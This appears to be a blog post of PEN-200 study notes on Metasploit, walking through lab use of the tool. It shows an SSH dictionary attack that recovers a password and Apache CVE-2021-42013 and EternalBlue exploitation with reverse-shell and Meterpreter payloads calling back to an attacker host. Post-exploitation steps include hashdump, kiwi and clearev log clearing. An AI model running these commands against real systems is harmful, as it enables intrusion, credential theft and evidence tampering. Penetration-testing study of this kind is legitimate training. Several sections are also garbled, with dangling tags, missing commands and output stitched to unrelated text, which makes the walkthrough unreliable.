  <header class="blog-article-header">
    <h1 class="blog-article-title">PEN-200 Module 20 — Metasploit With Restraint</h1>
    <p class="blog-article-meta">
      
        <span>Nov 18, 2023</span>
      
      
        <span aria-hidden="true">•</span>
        <span>124 min read</span>
      
      
        <span aria-hidden="true">•</span>
        <span>m4xx3d0ut</span>
      
    </p>
  </header>

  

  <div class="blog-article-content">
    <h2>TLDR;</h2>
<p>Metasploit is invaluable when you treat it like any other engineering tool: scripted, logged, and explained. This pass adds the concrete procedures captured in the labs.</p>
<h3>Reconnaissance Modules</h3>
<pre><code>use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.119.0/24
run

use auxiliary/scanner/http/title
set THREADS 20
run
</code></pre>
<ul>
<li>Export run results (<code>services -S smb -u</code>).</li>
<li>Store workspace states: <code>workspace -a acme-internal</code> then <code>db_export -f xml acme-internal.xml</code> for backup.</li>
</ul>
<h3>Exploitation Workflow</h3>
<ol>
<li>Load module → <code>show options</code> → set <code>RHOSTS</code>, <code>RPORT</code>, <code>PAYLOAD</code>, <code>LHOST</code>, <code>LPORT</code>.</li>
<li>Use <code>check</code> when available to confirm vulnerability.</li>
<li>Enable logging: <code>spool logs/acme-msf.log</code> before <code>run</code>.</li>
</ol>
<pre><code>use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.119.21
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.49.1
set EXITFUNC thread
run -j
</code></pre>
<ul>
<li>Record session IDs, pivot hosts, and post modules executed.</li>
</ul>
<h3>Post-Exploitation Discipline</h3>
<pre><code>sessions -i 1
sysinfo
getuid
hashdump
load kiwi

run post/windows/gather/enum_logged_on_users
run post/multi/gather/enum_domain_group_users GROUP=&quot;Domain Admins&quot;
</code></pre>
<ul>
<li>Dump loot into organised directories (<code>loot</code>, <code>download</code>).</li>
<li>Clean up (<code>clearev</code>, <code>migrate</code>, <code>sessions -k &lt;id&gt;</code>) once tasks complete.</li>
</ul>
<h3>Automation</h3>
<ul>
<li>Resource scripts (<code>msfconsole -r scripts/acme_exploit.rc</code>) to reproduce module setups. Include comments and <code>sleep</code> commands when waiting for services.</li>
<li>Metasploit RPC for integration:</li>
</ul>
<pre><code>msfrpcd -P supersecret -S
python3 metasploit_helper.py --module exploit/windows/http/struts2_content_type_ognl --rhosts 192.168.119.45
</code></pre>
<ul>
<li>Always store resource files and automation scripts in version control with timestamps.</li>
</ul>
<h3>Operational Hygiene</h3>
<ul>
<li>Disable <code>autopwn</code>, default payloads, and <code>Meterpreter</code> features not explicitly required by rules of engagement.</li>
<li>Log every module you run, including unsuccessful ones, for transparency.</li>
</ul>
<h3>Defensive Recommendations</h3>
<ul>
<li>Provide patch KB references, disabling SMBv1, enabling RDP network-level authentication, etc.</li>
<li>Supply detection ideas: unusual <code>svchost</code> behaviour, creation of service <code>%TEMP%\random.exe</code>, outbound HTTPS to C2 IP.</li>
</ul>
<p>Metasploit should never be a black box. Script it, log it, and justify every module so the client gains confidence alongside the shell access you deliver.</p>
<h2>Working Notes... In Graphic Detail...</h2>
<h3>The Metasploit Framework</h3>
<ul>
<li>Getting Familiar with Metasploit.</li>
<li>Using Metasploit Payloads.</li>
<li>Performing Post-Exploitation with Metasploit.</li>
<li>Automating Metasploit.</li>
</ul>
<h4>20.1 Getting Familiar with Metasploit</h4>
<ul>
<li>Setup and navigate Metasploit.</li>
<li>Use auxiliary modules.</li>
<li>Leverage exploit modules.</li>
</ul>
<h5>Setup and Work with MSF</h5>
<p>MSF comes preinstalled on Kali but doesn&#39;t start its DB service in the default configuration.  Use of the DB is not mandatory, but there are compelling reasons to like storing info about target hosts and tracking successful exploitation attempts.  MSF uses PostgresSQL as a DB service, which is not active or enable on boot in Kali.</p>
<p>We can start, create, and initialize the MSF DB with <code>msfdb init</code>.</p>
<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
└─$ sudo msfdb init                                          
[sudo] password for operator: 
[+] Starting database
[+] Creating database user &#39;msf&#39;
[+] Creating databases &#39;msf&#39;
[+] Creating databases &#39;msf_test&#39;
[+] Creating configuration file &#39;/usr/share/metasploit-framework/config/database.yml&#39;
[+] Creating initial database schema
</code></pre>
<p>To enable the DB service at boot time we use <code>systemctl</code>.</p>
<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
└─$ sudo systemctl enable postgresql   
Synchronizing state of postgresql.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable postgresql
Created symlink /etc/systemd/system/multi-user.target.wants/postgresql.service → /lib/systemd/system/postgresql.service.
</code></pre>
<p>Launch the Metasploit CLI with <code>msfconsole</code>.</p>
<pre><code class="language-bash">┌──(operator@labhost)-[~/OffSec/msf]
└─$ sudo msfconsole                 
                                                  
### cowsay++
 ____________
&lt; metasploit &gt;
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v6.3.31-dev                          ]
+ -- --=[ 2346 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1388 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Search can apply complex filters such as 
search cve:2009 type:exploit, see all the filters 
with help search
Metasploit Documentation: https://docs.metasploit.com/

msf6 &gt;
</code></pre>
<ul>
<li>Hide the banner and version info on start up with <code>-q</code></li>
</ul>
<p>Once the CLI has started we can verify the DB connectivity with <code>db_status</code>.</p>
<pre><code>msf6 &gt; db_status
[*] Connected to msf. Connection type: postgresql.
</code></pre>
<ul>
<li>The DB is connected and we are all setup.</li>
</ul>
<p>The CLI of MSF provides numerous commands to navigate the framework, divided into <a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/">categories</a>.  The categories consist of Core Commands, Module Commands, Job Commands, Resource Script Commands, Database Backend Commands, Credentials Backend Commands, and Developer Commands.</p>
<p>We can list all available commands by entering <code>help</code>.</p>
<pre><code>msf6 &gt; help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    debug         Display information useful for debugging
    exit          Exit the console
    features      Display the list of not yet released features that can be opted in to
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    load          Load a framework plugin
    quit          Exit the console
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    tips          Show a list of useful productivity tips
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers

===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    clearm        Clear the module stack
    favorite      Add module(s) to the list of favorite modules
    favorites     Print the list of favorite modules (alias for `show favorites`)
    info          Displays information about one or more modules
    listm         List the module stack
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Interact with a module by name or search term/index


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command       Description
    -------       -----------
    analyze       Analyze database information about a specific address or address rang
                  e
    db_connect    Connect to an existing data service
    db_disconnec  Disconnect from the current data service
    t
    db_export     Export a file containing the contents of the database
    db_import     Import a scan result file (filetype will be auto-detected)
    db_nmap       Executes nmap and records the output automatically
    db_rebuild_c  Rebuilds the database-stored module cache (deprecated)
    ache
    db_remove     Remove the saved data service entry
    db_save       Save the current data service connection as the default to reconnect
                  on startup
    db_status     Show the current data service status
    hosts         List all hosts in the database
    klist         List Kerberos tickets in the database
    loot          List all loot in the database
    notes         List all notes in the database
    services      List all services in the database
    vulns         List all vulnerabilities in the database
    workspace     Switch between database workspaces


Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database


Developer Commands
==================

    Command       Description
    -------       -----------
    edit          Edit the current module or a file with the preferred editor
    irb           Open an interactive Ruby shell in the current context
    log           Display framework.log paged to the end if possible
    pry           Open the Pry debugger on the current module or Framework
    reload_lib    Reload Ruby library files from specified paths
    time          Time how long it takes to run a particular command


msfconsole
==========

`msfconsole` is the primary interface to Metasploit Framework. There is quite a
lot that needs go here, please be patient and keep an eye on this space!

Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.

##### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.

##### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)

##### Examples

Terminate the first sessions:

    sessions -k 1

Stop some extra running jobs:

    jobs -k 2-6,7,8,11..15

Check a set of IP addresses:

    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255

Target a set of IPv6 hosts:

    set RHOSTS fe80::3990:0000/110, ::1-::f0f0

Target a block from a resolved domain name:

    set RHOSTS www.example.test/24
</code></pre>
<p>Before jumping into operations in MSF, let&#39;s discuss workspaces.  Assume we have performed a pentest and Metasploit stored all info about our target and infrastructure in the database.  When we start the next pentest that info will still be in the DB, to avoid mixing assessment results we can use workspaces.</p>
<p>The MSF <code>workspace</code> command lists all previously created workspaces, we can switch them by adding the name to the command.  To create a new workspace provide the name as an argument to <code>-a</code>.</p>
<p>Create a workspace name <code>pen200</code> for us to store the results of this section.</p>
<pre><code>msf6 &gt; workspace
* default
msf6 &gt; workspace -a pen200
[*] Added workspace: pen200
[*] Workspace: pen200
msf6 &gt; workspace
  default
* pen200
</code></pre>
<p>Once created, Metasploit will use it as a current workspace.</p>
<p>Let&#39;s populate the DB and familiarize ourselves with some of the Databse Backend Commands.  We can scan BRUTE2 with <code>db_nmap</code> which is a wrapper to execute Nmap inside Metasploit and save the finding to the DB.  The command syntax is identical to Nmap.</p>

</code></pre>
<ul>
<li>If the DB service is running, Metasploit will log findings and info about discovered hosts, services, or credentials in a convenient, accessible database.</li>
</ul>
<p>To list all discovered hosts we can enter <code>hosts</code>.</p>
<pre><code>msf6 &gt; hosts

Hosts
=====

address       mac  name  os_name       os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------       ---------  -----  -------  ----  --------
192.168.197.             Windows 2022                    server
202
</code></pre>
<p>Enter <code>services</code> to display the discovered services from our port scan, we can filter for specific port number by providing it as an argument to <code>-p</code>.</p>
<pre><code>msf6 &gt; services
Services
========

host          port  proto  name           state  info
----          ----  -----  ----           -----  ----
192.168.197.  21    tcp    ftp            open
202
192.168.197.  135   tcp    msrpc          open   Microsoft Windows RPC
202
192.168.197.  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
202

202

202

202                                              c or InfluxDB API

msf6 &gt; services -p 8000
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
192.168.197.  8000  tcp    http  open   Golang net/http server Go-IPFS json-rpc or Infl
202                                     uxDB API
</code></pre>
<ul>
<li>See all discovered services up to this point.</li>
<li>Quickly identify all hosts with a specific service running.</li>
</ul>
<p>When working with numerous target systems during an assessment, the Database Backend Commands are invaluable in identifying important info and discovering potential attack vectors.  Results stored in the DB can also be used as input to modules, which we will discuss in the next section.</p>
<p>Let&#39;s briefly review modules again, modules are used to perform tasks in Metasploit such as scanning or exploiting targets.  The framework includes several thousand modules divided into categories.</p>
<p>The categories are displayed on the splash screen summary and can be viewed with the <code>show -h</code> command.</p>
<pre><code>msf6 &gt; show -h
[*] Valid parameters for the &quot;show&quot; command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
</code></pre>
<ul>
<li>Shows the categories of the Metasploit modules.</li>
</ul>
<p>To activate a module we enter the <code>use</code> command with the module name.  The modules all follow a common slash-delimeted hierarchal syntax.</p>
<ul>
<li><code>module type/os</code></li>
<li><code>vendor</code></li>
<li><code>app</code></li>
<li><code>operation</code></li>
<li><code>protocol/module name</code>
This makes it easy to explore and use modules.  We will explore auxiliary modules in the next section and then dive into exploit modules.</li>
</ul>
<h5>Auxiliary Modules</h5>
<p>MSF includes hundreds of auxiliary modules, priving functionality such as proto enum, port scanning, fuzzing, sniffing, and more.  Aux mods are useful for many tasks including info gathering (under the gather/hierarchy), and so on.</p>
<p>There are too many to cover, but we will demonstrate the syntax and operation of two very common auxiliary modules.  To list all aux mods, we can run the <code>show auxiliary</code> command.  This presents us with a long list of all aux mods.</p>
<pre><code>msf6 &gt; show auxiliary

Auxiliary
=========

   #     Name                                                                     Disclosure Date  Rank    Check  Description
   -     ----                                                                     ---------------  ----    -----  -----------
   0     auxiliary/admin/2wire/xslt_password_reset                                2007-08-15       normal  No     2Wire Cross-Site Request Forgery Password Reset Vulnerability
   1     auxiliary/admin/android/google_play_store_uxss_xframe_rce                                 normal  No     Android Browser RCE Through Google Play Store XFO
   2     auxiliary/admin/appletv/appletv_display_image                                             normal  No     Apple TV Image Remote Control
   3     auxiliary/admin/appletv/appletv_display_video                                             normal  No     Apple TV Video Remote Control
   4     auxiliary/admin/atg/atg_client                                                            normal  No     Veeder-Root Automatic Tank Gauge (ATG) Administrative Client
   5     auxiliary/admin/aws/aws_launch_instances                                                  normal  No     Launches Hosts in AWS
   6     auxiliary/admin/backupexec/dump                                                           normal  No     Veritas Backup Exec Windows Remote File Access
   7     auxiliary/admin/backupexec/registry                                                       normal  No     Veritas Backup Exec Server Registry Access

   9     auxiliary/admin/chromecast/chromecast_youtube                                             normal  No     Chromecast YouTube Remote Control
...
</code></pre>
<p>We can use <code>search</code> to reduce the output considerably, filtering by app, type, CVE ID, operation, platform, and more.  In this example, we want to obtain the SMB version of the previously scanned system BRUTE2 by using a Metasploit aux mod.</p>

<ul>
<li>This shows us all SMB aux modules the search has identified.</li>
</ul>
<p>To activate a mod we enter <code>use</code> followed by the mod name or using the index provided from the search result.  Using the later, activate the mod <code>auxiliary/scanner/smb/smb_version</code> with index <code>56</code>.</p>
<pre><code>msf6 &gt; use 56
msf6 auxiliary(scanner/smb/smb_version) &gt;
</code></pre>
<ul>
<li>The command prompt indicates the active module.</li>
</ul>
<p>To get info about the current active mod we can enter <code>info</code>.</p>
<pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; info

       Name: SMB Version Detection
     Module: auxiliary/scanner/smb/smb_version
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  hdm &lt;x@hdm.io&gt;
  Spencer McIntyre
  Christophe De La Fuente

Check supported:
  No

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS                    yes       The target host(s), see https://docs.metasploit.c
                                      om/docs/using-metasploit/basics/using-metasploit.
                                      html
  THREADS  1                yes       The number of concurrent threads (max one per hos
                                      t)

Description:
  Fingerprint and display version information about SMB servers. Protocol
  information and host operating system (if available) will be reported.
  Host operating system detection requires the remote server to support
  version 1 of the SMB protocol. Compression and encryption capability
  negotiation is only present in version 3.1.1.


View the full module info with the info -d command.
</code></pre>
<ul>
<li>The description provides info about the purpose of the module.</li>
</ul>
<p>The output shows the Basic options and args of the mod.  We can also display options of a mod by entering <code>show options</code>.  The options contain a column named <code>Required</code>, which specifies if a value needs to be set before launching a mod.  Most Metasploit mods will set some of the options for us.</p>
<pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.
                                       com/docs/using-metasploit/basics/using-metasploi
                                       t.html
   THREADS  1                yes       The number of concurrent threads (max one per ho
                                       st)


View the full module info with the info, or info -d command.
</code></pre>
<ul>
<li>Shows the option RHOSTS has no value set but is required by the module.</li>
<li><em>To display all required, but not yet set, options we can use the command show missing.</em>.</li>
</ul>
<p>We can add or remove values from options with <code>set</code> and <code>unset</code>.  We will <code>set</code> the value of RHOSTS to the IP of BRUTE2.</p>
<pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 192.168.197.202
RHOSTS =&gt; 192.168.197.202
</code></pre>
<p>Instead of setting the value manually we can set RHOSTS automatically with DB results.  We can set RHOSTS to all discovered hosts with open port 445 by entering <code>services</code>, the port number as <code>-p</code> arg, and <code>--rhosts</code> to set the results for this option.  First we <code>unset</code> the manually set value.</p>
<pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; unset RHOSTS
Unsetting RHOSTS...
msf6 auxiliary(scanner/smb/smb_version) &gt; services -p 445 --rhosts
Services
========

host             port  proto  name          state  info
----             ----  -----  ----          -----  ----
192.168.197.202  445   tcp    microsoft-ds  open

RHOSTS =&gt; 192.168.197.202
</code></pre>
<ul>
<li>Metasploit set the value for RHOSTS using DB results.</li>
</ul>
<p>With required options set, we can launch the mod by entering <code>run</code>.</p>
<pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; run

[*] 192.168.197.202:445   - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1, Pattern_V1) (encryption capabilities:AES-256-GCM) (signatures:optional) (guid:{ce3451ca-39b8-4812-a0d9-3e1ab8c7c379}) (authentication domain:BRUTE2)
[*] 192.168.197.202:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>
<ul>
<li>The output shows that the target system supports version 2/3 of SMB and prefers SMB 3.1.1.</li>
</ul>
<p>Next, we use the <code>vulns</code> command to show if Metasploit detected any vulnerabilites based on the results of this module.</p>
<pre><code>msf6 auxiliary(scanner/smb/smb_version) &gt; vulns

Vulnerabilities
===============

Timestamp             Host             Name                     References
---------             ----             ----                     ----------

<ul>
<li>Our DB contains one vuln entry for <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing">SMB Signing is not required</a></li>
<li>This is a great way to quickly identify vulns without the use of a vulnerability scanner.</li>
</ul>

<p>We will activate <code>auxiliary/scanner/ssh/ssh_login</code> using index <code>15</code> and display its options.</p>

   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works f
                                                or a host
   THREADS           1                yes       The number of concurrent threads (max o
                                                ne per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords sep
                                                arated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for al
                                                l users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempt
                                                s


View the full module info with the info, or info -d command.
</code></pre>
<ul>
<li>There are various options to set in this module.</li>
<li>Metasploit already set several for us.</li>
<li>Similar to Hydra, we can set a password and user or provide files containing users, passwords, or both.</li>
</ul>
<p>In the example Password Attacks, we assume we already identified user <code>george</code>, specify the <code>rockyou.txt</code> for options <code>PASS_FILE</code>. </p>
<ul>
<li>Set <code>RHOSTS</code> to <code>192.168.197.201</code></li>
<li>Set <code>RPORT</code> to <code>2222</code></li>
</ul>
<pre><code>msf6 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE =&gt; /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) &gt; set USERNAME george
USERNAME =&gt; george
msf6 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 192.168.197.201
RHOSTS =&gt; 192.168.197.201
msf6 auxiliary(scanner/ssh/ssh_login) &gt; set RPORT 2222
RPORT =&gt; 2222
</code></pre>
<p>With the required options set we can launch the mod with <code>run</code>.</p>
<pre><code>msf6 auxiliary(scanner/ssh/ssh_login) &gt; run

[*] 192.168.197.201:2222 - Starting bruteforce
[+] 192.168.197.201:2222 - Success: &#39;george:chocolate&#39; &#39;uid=1000(george) gid=0(root) groups=0(root),27(sudo) Linux 9195ad6f4213 5.15.0-50-generic #56-Ubuntu SMP Tue Sep 20 13:23:26 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux &#39;
[*] SSH session 1 opened (192.168.45.182:34005 -&gt; 192.168.197.201:2222) at 2023-11-19 16:39:30 -0800
</code></pre>
<ul>
<li>Metasploit performed the dict attack and determined the correct password.</li>
<li>Unlike Hydra, it also opens a session.</li>
</ul>
<p>As with the <code>vulns</code> command, we can display all valid credentials with <code>creds</code>.</p>
<pre><code>msf6 auxiliary(scanner/ssh/ssh_login) &gt; creds
Credentials
===========

host             origin           service         public  private    realm  private_type  JtR Format
----             ------           -------         ------  -------    -----  ------------  ----------
192.168.197.201  192.168.197.201  2222/tcp (ssh)  george  chocolate         Password
</code></pre>
<p>Metasploit stores the valid creds in the DB, shows us the related host, the service, and the type of creds.</p>
<h5>Exploit Modules</h5>
<p>Exploit modules contain exploit code for applications and services with known vulns.  Metasploit contains over 2200 exploits (2023), each developed/tested, making MSF highly capable of exploiting a wide range of targets.  The exploits are invoked in a similar manner to auxiliary modules.</p>
<p>In this example we will access the target system, WEB18, using one of the included exploit modules.  Assume we identified the target systems running Apache 2.4.49 web server, vulnerable to CVE-2021-42013.  We&#39;ll attempt to use MSF and its exploit modules to get code execution.</p>
<p>Create a workspace for this section and search MSF for modules related to &quot;Apache 2.4.49&quot;.</p>
<pre><code>msf6 auxiliary(scanner/ssh/ssh_login) &gt; workspace -a exploits
[*] Added workspace: exploits
[*] Workspace: exploits
msf6 auxiliary(scanner/ssh/ssh_login) &gt; workspace 
  default
  pen200
* exploits
msf6 auxiliary(scanner/ssh/ssh_login) &gt; search Apache 2.4.49

================

   1  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/apache_normalize_path
</code></pre>

<li>Artifacts on disk.</li>
<li>Module stability.</li>

<li>What info defenders may obtain from our using this exploit.</li>
</ul>
<p>Module reliability determines if we can run the exploit more than once.  In our example the ouput states repeatable-session.  This is important because some exploit modules will only work once.</p>
<p>The targets availble area of the output contains target specs of vulerabile targets by the exploit mod, ranging from diff OS, app versions, to command exec methods.  Most mods provide the Automatic target which tries to identify either by itself or by using the defaul op specified in the module.</p>
<p>Descriptions provides us a text-based explanation of mod purpose, this mod appears to be correct mod for the vuln in this scenario.</p>
<p>Now we understand what the exploit mod does and what its implications are, we can display its options.</p>
<pre><code>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show options

<p>For now, we will set Payload to a regular TCP reverse shell.  We can select with <code>set payload</code> and the payload name, <code>payload/linux/x64/shell_reverse_tcp</code>.  We also enter the IP of our Kali machine as <code>LHOST</code>.</p>

<li>LPORT set default <code>4444</code></li>
</ul>
<p><em>In real penetration tests we may face the situation that port 4444 is blocked by firewalls or other security technologies. This is quite common as it is the default port for Metasploit&#39;s modules. In situations like this, changing the port number to ports associated with more commonly used protocols such as HTTP or HTTPS may lead to a successful execution of the selected payload.</em></p>
<p>Note that we don&#39;t need to start a manual listener with Netcat to catch the rev shell, Metasploit does this automatically for the selected payload.</p>
<p>Now, let&#39;s set the options <code>SSL</code> to <code>false</code> and <code>RPORT</code> to <code>80</code>, then set <code>RHOSTS</code> to target IP and enter <code>run</code>.</p>
<pre><code>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set SSL false
[!] Changing the SSL option&#39;s value may require changing RPORT!
SSL =&gt; false
msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set RPORT 80
RPORT =&gt; 80
msf6 exploit(multi/http/apache_normalize_path_rce) &gt; set RHOSTS 192.168.205.16
RHOSTS =&gt; 192.168.205.16
msf6 exploit(multi/http/apache_normalize_path_rce) &gt; run

[*] Started reverse TCP handler on 192.168.45.182:4444 
[*] Using auxiliary/scanner/http/apache_normalize_path as check

<ul>
<li>The exploit starts a listener on <code>4444</code></li>
<li>Checks if target is vulnerable.</li>
<li>Vuln exploited and payload sent.</li>
<li>Console states session open and we have rce.</li>
</ul>
<p>Let&#39;s explore the concept of sessions and jobs in Metasploit.  Sessions are used to interact and manage access to successfully exploited targets, while jobs are used to run modules or features in the background.</p>
<p>When we launched the exploit with <code>run</code>, a session was created and we obtained a shell.  We can background the session with <code>Ctrl+Z</code> and prompt confirmation.  Once sent to the background, we can use <code>sessions -l</code> to list all active sessions.</p>
<pre><code class="language-id">uid=1(daemon) gid=1(daemon) groups=1(daemon)
^Z
Background session 2? [y/N]  y
msf6 exploit(multi/http/apache_normalize_path_rce) &gt; sessions -l

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  2         shell x64/linux               192.168.45.182:4444 -&gt; 192.168.205.16:56688 (
                                          192.168.205.16)
</code></pre>
<ul>
<li>Provides info about target and payload in use.</li>
<li>Making it easy to identify which session manages access to which target.</li>
</ul>
<p>Interact with a session again by passing the session ID to <code>sessions -i</code>.</p>
<pre><code>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; sessions -i 2
[*] Starting interaction with 2...

uname -a
Linux 5def8107a7b2 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
</code></pre>
<ul>
<li>We can enter commands into the interactive shell again.</li>
<li>Kill a session with <code>sessions -k</code> and the ID as arg.  .</li>
</ul>
<p>Instead of launching an exploit and sending the resulting session to the background, we can use <code>run -j</code> to launch it in the context of a job.  We&#39;ll still get the output of the mod, but need to interact with the session before we can access it.</p>
<p>In an assessment, we face many targets, making it easy to lose track of machines we already have access to.  Using a framework like MSF helps us manage access to these systems.  Eliminating the need to search through terminals for the correct session.  Launch exploit modules with <code>run -j</code> to launch exploit modules in the background, MDF will create the session for us, while we are already working on the next target.</p>
<p>MSF also stores info about targets, mod results, and vulns in the DB.  Valuable for furhter steps in the pentest and reporting to the client.</p>
<h4>20.2 Using Metasploit Payloads</h4>
<ul>
<li>Understand the differences between staged and non-staged payloads.</li>
<li>Explore the Meterpreter payload.</li>
<li>Create executable payloads.</li>
</ul>
<h5>Staged vs Non-Staged Payloads</h5>
<p>Let&#39;s explore the difference between stages and non-staged payloads.  Assume we have identified a buffer overflow vuln in a server.  As we learned, we must be aware of the buffer size our shellcode will be stored in.  If the shellcode size exceeds buffer, our exploit will fail, making payload type vital.</p>
<p>The diff is subtle but important.  A non-staged payload is sent complete with the exploit, the payload contains the exploit and full shellcode for task.  Generally, these all-in-one payloads are more stable, but the size is larger than other types.</p>
<p>Staged payloads are sent in two parts.  The first is a small primary payload that has the victim connect back to the attacker, transfering a larget secondary payload with the rest of the shellcode, finally executing it.</p>
<p>There are several situations in which we would prefer to use a staged payload instead of non-staged.  A staged payload may be a better choice when there are space limitations in an exploit, they are typically smaller.  AV can detect shellcode in an exploit, by utilizing a first stage, which loads second stage shellcode, retrieving the shellcode and injecting into memory detection may be prevented, increasing out chances of success.</p>
<p>With our basic understanding of the two payload types, we will use the same exploit mod as in the prior section and enter <code>show payloads</code>, getting a list of all compatible payloads.</p>
<pre><code>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; show payloads
Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
...
   15  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
...
   20  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
...
</code></pre>
<ul>
<li>Shows the payload we used at index <code>20</code></li>
<li>The <code>/</code> char is used to denote whether a payload is staged or not.</li>
<li><code>shell_reverse_tcp</code> at <code>20</code> is not staged.</li>
<li><code>shell/reverse_tcp</code> at <code>15</code> is staged.</li>
</ul>
<p>Use the staged payload for this exploit module and launch it, Metasploit will reuse the vals for the options form the previous payload.</p>
<pre><code>msf6 exploit(multi/http/apache_normalize_path_rce) &gt; db_nmap -A 192.168.250.16

Payload information:

Description:
  This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
  If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
  it can be used to execute arbitrary commands (Remote Command Execution).
  This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).

<h5>Meterpreter Payload</h5>
<p>We used a common TCP rev shell in the last section, which provided an interactive shell on the target system, but we only had the functionality of a regular command shell.  Exploit frameworks often contain more advanced payloads providing features like file transfer, pivoting, and various other methods of interaction.</p>
<p>Metasploit contains the <a href="https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html">Meterpreter</a> payload, a multi-function payload that can be dynamically extended at run-time.  the payload resides entirely in memory on the target and its comms are encrypted by default.  Meterpreter offers capabilities that are especially useful in the post-exploitation phase and is available for various OS.</p>
<ul>
<li>Windows.</li>
<li>Linux.</li>
<li>MacOS.</li>
<li>Android.</li>
